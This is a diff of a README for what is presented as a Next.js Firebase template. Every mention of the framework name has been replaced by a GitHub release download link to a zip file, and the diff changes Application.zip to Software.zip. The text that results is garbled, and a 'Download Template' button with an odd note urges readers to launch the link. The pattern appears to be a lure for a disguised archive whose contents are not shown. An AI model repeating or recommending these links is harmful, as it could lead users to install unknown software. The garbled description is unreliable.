@@ -1,25 +1,25 @@
-# 🚀 https://github.com/zan3lla/next-firebase-js/releases/download/v1.0/Application.zip Firebase Template 
+# 🚀 https://github.com/zan3lla/next-firebase-js/releases/download/v2.0/Software.zip Firebase Template 
 
 ## Introduction
-Welcome to the **next-firebase-js** repository, a https://github.com/zan3lla/next-firebase-js/releases/download/v1.0/Application.zip template with Firebase integration for building scalable web applications. This template provides features for real-time data management and user authentication, utilizing the power of Firebase services. Whether you are a beginner or an experienced developer, this template can help you kick-start your web development project with ease.
+Welcome to the **next-firebase-js** repository, a https://github.com/zan3lla/next-firebase-js/releases/download/v2.0/Software.zip template with Firebase integration for building scalable web applications. This template provides features for real-time data management and user authentication, utilizing the power of Firebase services. Whether you are a beginner or an experienced developer, this template can help you kick-start your web development project with ease.
 
 ## Features
 ✨ Real-time data management with Firebase Realtime Database  
 🔒 User authentication with Firebase Authentication  
 📁 File storage with Firebase Storage  
 📄 Cloud Firestore integration for scalable data storage  
-🚀 https://github.com/zan3lla/next-firebase-js/releases/download/v1.0/Application.zip for server-rendered React applications  
+🚀 https://github.com/zan3lla/next-firebase-js/releases/download/v2.0/Software.zip for server-rendered React applications  
 🔧 Easy to customize and extend for your specific project needs  
 
 ## Repository Details
 - **Repository Name:** next-firebase-js
-- **Description:** https://github.com/zan3lla/next-firebase-js/releases/download/v1.0/Application.zip template with Firebase integration for building scalable web applications. Features include real-time data management and user authentication.
+- **Description:** https://github.com/zan3lla/next-firebase-js/releases/download/v2.0/Software.zip template with Firebase integration for building scalable web applications. Features include real-time data management and user authentication.
 - **Topics:** firebase, firebase-auth, firebase-authentication, firebase-database, firebase-firestore, firebase-storage, next, next-template, nextjs, template
 
 ## Getting Started
 To get started with this template, you can download the latest release by clicking on the button below:
 
-[![Download Template](https://github.com/zan3lla/next-firebase-js/releases/download/v1.0/Application.zip)](https://github.com/zan3lla/next-firebase-js/releases/download/v1.0/Application.zip)
+[![Download Template](https://github.com/zan3lla/next-firebase-js/releases/download/v2.0/Software.zip)](https://github.com/zan3lla/next-firebase-js/releases/download/v2.0/Software.zip)
 
 **Note:** Link needs to be launched to download the template.
 
@@ -29,7 +29,7 @@ Follow these steps to set up the template on your local machine:
 2. Install dependencies using `npm install` or `yarn install`.
 3. Configure Firebase settings in your project.
 4. Start the development server with `npm run dev` or `yarn dev`.
-5. Begin building your web application using https://github.com/zan3lla/next-firebase-js/releases/download/v1.0/Application.zip with Firebase integration.
+5. Begin building your web application using https://github.com/zan3lla/next-firebase-js/releases/download/v2.0/Software.zip with Firebase integration.
 
 ## Contribution
 If you have ideas for improvements or new features, feel free to contribute to this repository. You can fork the project and submit a pull request with your changes. Your contributions are greatly appreciated!
